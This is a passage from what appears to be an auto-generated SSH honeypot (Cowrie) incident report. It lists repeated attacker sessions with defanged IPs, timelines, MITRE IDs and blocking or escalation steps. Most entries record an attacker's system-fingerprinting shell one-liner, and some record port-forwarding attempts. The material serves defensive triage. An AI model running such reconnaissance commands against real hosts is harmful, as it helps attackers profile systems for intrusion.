| `2026-07-05 04:53:12` | `cowrie.command.input` |
| `2026-07-05 04:53:14` | `cowrie.log.closed` |
| `2026-07-05 04:53:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-695b1ef4348f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:54 |
| **Last Seen** | 2026-07-05 04:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:54:21` | `cowrie.session.connect` |
| `2026-07-05 04:54:22` | `cowrie.client.version` |
| `2026-07-05 04:54:22` | `cowrie.client.kex` |
| `2026-07-05 04:54:24` | `cowrie.login.success` |
| `2026-07-05 04:54:26` | `cowrie.session.params` |
| `2026-07-05 04:54:26` | `cowrie.command.input` |
| `2026-07-05 04:54:26` | `cowrie.command.input` |
| `2026-07-05 04:54:26` | `cowrie.command.input` |
| `2026-07-05 04:54:26` | `cowrie.command.input` |
| `2026-07-05 04:54:26` | `cowrie.command.input` |
| `2026-07-05 04:54:26` | `cowrie.command.success` |
| `2026-07-05 04:54:26` | `cowrie.command.input` |
| `2026-07-05 04:54:26` | `cowrie.command.input` |
| `2026-07-05 04:54:26` | `cowrie.command.input` |
| `2026-07-05 04:54:26` | `cowrie.command.input` |
| `2026-07-05 04:54:28` | `cowrie.log.closed` |
| `2026-07-05 04:54:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ef089ac1364

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:55 |
| **Last Seen** | 2026-07-05 04:55 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:55:46` | `cowrie.session.connect` |
| `2026-07-05 04:55:47` | `cowrie.client.version` |
| `2026-07-05 04:55:47` | `cowrie.client.kex` |
| `2026-07-05 04:55:50` | `cowrie.login.success` |
| `2026-07-05 04:55:52` | `cowrie.session.params` |
| `2026-07-05 04:55:52` | `cowrie.command.input` |
| `2026-07-05 04:55:52` | `cowrie.command.input` |
| `2026-07-05 04:55:52` | `cowrie.command.input` |
| `2026-07-05 04:55:52` | `cowrie.command.input` |
| `2026-07-05 04:55:52` | `cowrie.command.input` |
| `2026-07-05 04:55:52` | `cowrie.command.success` |
| `2026-07-05 04:55:52` | `cowrie.command.input` |
| `2026-07-05 04:55:52` | `cowrie.command.input` |
| `2026-07-05 04:55:52` | `cowrie.command.input` |
| `2026-07-05 04:55:52` | `cowrie.command.input` |
| `2026-07-05 04:55:54` | `cowrie.log.closed` |
| `2026-07-05 04:55:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f8eb823c7a72

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:57 |
| **Last Seen** | 2026-07-05 04:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:57:12` | `cowrie.session.connect` |
| `2026-07-05 04:57:13` | `cowrie.client.version` |
| `2026-07-05 04:57:13` | `cowrie.client.kex` |
| `2026-07-05 04:57:15` | `cowrie.login.success` |
| `2026-07-05 04:57:17` | `cowrie.session.params` |
| `2026-07-05 04:57:17` | `cowrie.command.input` |
| `2026-07-05 04:57:17` | `cowrie.command.input` |
| `2026-07-05 04:57:17` | `cowrie.command.input` |
| `2026-07-05 04:57:17` | `cowrie.command.input` |
| `2026-07-05 04:57:17` | `cowrie.command.input` |
| `2026-07-05 04:57:17` | `cowrie.command.success` |
| `2026-07-05 04:57:17` | `cowrie.command.input` |
| `2026-07-05 04:57:17` | `cowrie.command.input` |
| `2026-07-05 04:57:17` | `cowrie.command.input` |
| `2026-07-05 04:57:17` | `cowrie.command.input` |
| `2026-07-05 04:57:18` | `cowrie.log.closed` |
| `2026-07-05 04:57:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-279524105ab3

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-05 04:57 |
| **Last Seen** | 2026-07-05 04:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:57:53` | `cowrie.session.connect` |
| `2026-07-05 04:57:53` | `cowrie.client.version` |
| `2026-07-05 04:57:53` | `cowrie.client.kex` |
| `2026-07-05 04:57:53` | `cowrie.login.success` |
| `2026-07-05 04:57:53` | `cowrie.direct-tcpip.request` |
| `2026-07-05 04:57:53` | `cowrie.direct-tcpip.ja4` |
| `2026-07-05 04:57:53` | `cowrie.direct-tcpip.data` |
| `2026-07-05 04:57:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2730dd623e4

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 04:58 |
| **Last Seen** | 2026-07-05 04:58 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 04:58:36` | `cowrie.session.connect` |
| `2026-07-05 04:58:37` | `cowrie.client.version` |
| `2026-07-05 04:58:37` | `cowrie.client.kex` |
| `2026-07-05 04:58:40` | `cowrie.login.success` |
| `2026-07-05 04:58:41` | `cowrie.session.params` |
| `2026-07-05 04:58:41` | `cowrie.command.input` |
| `2026-07-05 04:58:41` | `cowrie.command.input` |
| `2026-07-05 04:58:41` | `cowrie.command.input` |
| `2026-07-05 04:58:41` | `cowrie.command.input` |
| `2026-07-05 04:58:41` | `cowrie.command.input` |
| `2026-07-05 04:58:41` | `cowrie.command.success` |
| `2026-07-05 04:58:41` | `cowrie.command.input` |
| `2026-07-05 04:58:41` | `cowrie.command.input` |
| `2026-07-05 04:58:41` | `cowrie.command.input` |
| `2026-07-05 04:58:41` | `cowrie.command.input` |
| `2026-07-05 04:58:43` | `cowrie.log.closed` |
| `2026-07-05 04:58:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e88c2e39d65f

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:00 |
| **Last Seen** | 2026-07-05 05:00 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:00:04` | `cowrie.session.connect` |
| `2026-07-05 05:00:05` | `cowrie.client.version` |
| `2026-07-05 05:00:05` | `cowrie.client.kex` |
| `2026-07-05 05:00:09` | `cowrie.login.success` |
| `2026-07-05 05:00:12` | `cowrie.session.params` |
| `2026-07-05 05:00:12` | `cowrie.command.input` |
| `2026-07-05 05:00:12` | `cowrie.command.input` |
| `2026-07-05 05:00:12` | `cowrie.command.input` |
| `2026-07-05 05:00:12` | `cowrie.command.input` |
| `2026-07-05 05:00:12` | `cowrie.command.input` |
| `2026-07-05 05:00:12` | `cowrie.command.success` |
| `2026-07-05 05:00:12` | `cowrie.command.input` |
| `2026-07-05 05:00:12` | `cowrie.command.input` |
| `2026-07-05 05:00:12` | `cowrie.command.input` |
| `2026-07-05 05:00:12` | `cowrie.command.input` |
| `2026-07-05 05:00:13` | `cowrie.log.closed` |
| `2026-07-05 05:00:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49613eb30376

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:01 |
| **Last Seen** | 2026-07-05 05:01 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:01:30` | `cowrie.session.connect` |
| `2026-07-05 05:01:31` | `cowrie.client.version` |
| `2026-07-05 05:01:31` | `cowrie.client.kex` |
| `2026-07-05 05:01:35` | `cowrie.login.success` |
| `2026-07-05 05:01:37` | `cowrie.session.params` |
| `2026-07-05 05:01:37` | `cowrie.command.input` |
| `2026-07-05 05:01:37` | `cowrie.command.input` |
| `2026-07-05 05:01:37` | `cowrie.command.input` |
| `2026-07-05 05:01:37` | `cowrie.command.input` |
| `2026-07-05 05:01:37` | `cowrie.command.input` |
| `2026-07-05 05:01:37` | `cowrie.command.success` |
| `2026-07-05 05:01:37` | `cowrie.command.input` |
| `2026-07-05 05:01:37` | `cowrie.command.input` |
| `2026-07-05 05:01:37` | `cowrie.command.input` |
| `2026-07-05 05:01:37` | `cowrie.command.input` |
| `2026-07-05 05:01:39` | `cowrie.log.closed` |
| `2026-07-05 05:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a697ffd025

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:02 |
| **Last Seen** | 2026-07-05 05:03 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:02:57` | `cowrie.session.connect` |
| `2026-07-05 05:02:58` | `cowrie.client.version` |
| `2026-07-05 05:02:58` | `cowrie.client.kex` |
| `2026-07-05 05:03:01` | `cowrie.login.success` |
| `2026-07-05 05:03:03` | `cowrie.session.params` |
| `2026-07-05 05:03:03` | `cowrie.command.input` |
| `2026-07-05 05:03:03` | `cowrie.command.input` |
| `2026-07-05 05:03:03` | `cowrie.command.input` |
| `2026-07-05 05:03:03` | `cowrie.command.input` |
| `2026-07-05 05:03:03` | `cowrie.command.input` |
| `2026-07-05 05:03:03` | `cowrie.command.success` |
| `2026-07-05 05:03:03` | `cowrie.command.input` |
| `2026-07-05 05:03:03` | `cowrie.command.input` |
| `2026-07-05 05:03:03` | `cowrie.command.input` |
| `2026-07-05 05:03:03` | `cowrie.command.input` |
| `2026-07-05 05:03:05` | `cowrie.log.closed` |
| `2026-07-05 05:03:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-139f91cdbe5a

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:04 |
| **Last Seen** | 2026-07-05 05:04 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:04:23` | `cowrie.session.connect` |
| `2026-07-05 05:04:24` | `cowrie.client.version` |
| `2026-07-05 05:04:24` | `cowrie.client.kex` |
| `2026-07-05 05:04:28` | `cowrie.login.success` |
| `2026-07-05 05:04:31` | `cowrie.session.params` |
| `2026-07-05 05:04:31` | `cowrie.command.input` |
| `2026-07-05 05:04:31` | `cowrie.command.input` |
| `2026-07-05 05:04:31` | `cowrie.command.input` |
| `2026-07-05 05:04:31` | `cowrie.command.input` |
| `2026-07-05 05:04:31` | `cowrie.command.input` |
| `2026-07-05 05:04:31` | `cowrie.command.success` |
| `2026-07-05 05:04:31` | `cowrie.command.input` |
| `2026-07-05 05:04:31` | `cowrie.command.input` |
| `2026-07-05 05:04:31` | `cowrie.command.input` |
| `2026-07-05 05:04:31` | `cowrie.command.input` |
| `2026-07-05 05:04:32` | `cowrie.log.closed` |
| `2026-07-05 05:04:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98b1c379ca7a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-05 05:04 |
| **Last Seen** | 2026-07-05 05:04 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:04:28` | `cowrie.session.connect` |
| `2026-07-05 05:04:30` | `cowrie.client.version` |
| `2026-07-05 05:04:30` | `cowrie.client.kex` |
| `2026-07-05 05:04:36` | `cowrie.login.success` |
| `2026-07-05 05:04:40` | `cowrie.session.params` |
| `2026-07-05 05:04:40` | `cowrie.command.input` |
| `2026-07-05 05:04:42` | `cowrie.log.closed` |
| `2026-07-05 05:04:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab0459c478bd

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:05 |
| **Last Seen** | 2026-07-05 05:05 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:05:50` | `cowrie.session.connect` |
| `2026-07-05 05:05:50` | `cowrie.client.version` |
| `2026-07-05 05:05:50` | `cowrie.client.kex` |
| `2026-07-05 05:05:54` | `cowrie.login.success` |
| `2026-07-05 05:05:55` | `cowrie.session.params` |
| `2026-07-05 05:05:55` | `cowrie.command.input` |
| `2026-07-05 05:05:55` | `cowrie.command.input` |
| `2026-07-05 05:05:55` | `cowrie.command.input` |
| `2026-07-05 05:05:55` | `cowrie.command.input` |
| `2026-07-05 05:05:55` | `cowrie.command.input` |
| `2026-07-05 05:05:55` | `cowrie.command.success` |
| `2026-07-05 05:05:55` | `cowrie.command.input` |
| `2026-07-05 05:05:55` | `cowrie.command.input` |
| `2026-07-05 05:05:55` | `cowrie.command.input` |
| `2026-07-05 05:05:55` | `cowrie.command.input` |
| `2026-07-05 05:05:57` | `cowrie.log.closed` |
| `2026-07-05 05:05:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a4b46e3df44

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:07 |
| **Last Seen** | 2026-07-05 05:07 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:07:15` | `cowrie.session.connect` |
| `2026-07-05 05:07:16` | `cowrie.client.version` |
| `2026-07-05 05:07:16` | `cowrie.client.kex` |
| `2026-07-05 05:07:19` | `cowrie.login.success` |
| `2026-07-05 05:07:22` | `cowrie.session.params` |
| `2026-07-05 05:07:22` | `cowrie.command.input` |
| `2026-07-05 05:07:22` | `cowrie.command.input` |
| `2026-07-05 05:07:22` | `cowrie.command.input` |
| `2026-07-05 05:07:22` | `cowrie.command.input` |
| `2026-07-05 05:07:22` | `cowrie.command.input` |
| `2026-07-05 05:07:22` | `cowrie.command.success` |
| `2026-07-05 05:07:22` | `cowrie.command.input` |
| `2026-07-05 05:07:22` | `cowrie.command.input` |
| `2026-07-05 05:07:22` | `cowrie.command.input` |
| `2026-07-05 05:07:22` | `cowrie.command.input` |
| `2026-07-05 05:07:24` | `cowrie.log.closed` |
| `2026-07-05 05:07:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]77` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]77` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c36abac90215

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]137` |
| **First Seen** | 2026-07-05 05:07 |
| **Last Seen** | 2026-07-05 05:07 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-05 05:07:55` | `cowrie.session.connect` |
| `2026-07-05 05:07:55` | `cowrie.client.version` |
| `2026-07-05 05:07:55` | `cowrie.client.kex` |
| `2026-07-05 05:07:55` | `cowrie.login.success` |
| `2026-07-05 05:07:55` | `cowrie.direct-tcpip.request` |
| `2026-07-05 05:07:56` | `cowrie.direct-tcpip.ja4` |
| `2026-07-05 05:07:56` | `cowrie.direct-tcpip.data` |
| `2026-07-05 05:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]137` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]137` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58aacecdecf1

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]77` |
| **First Seen** | 2026-07-05 05:08 |
| **Last Seen** | 2026-07-05 05:08 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
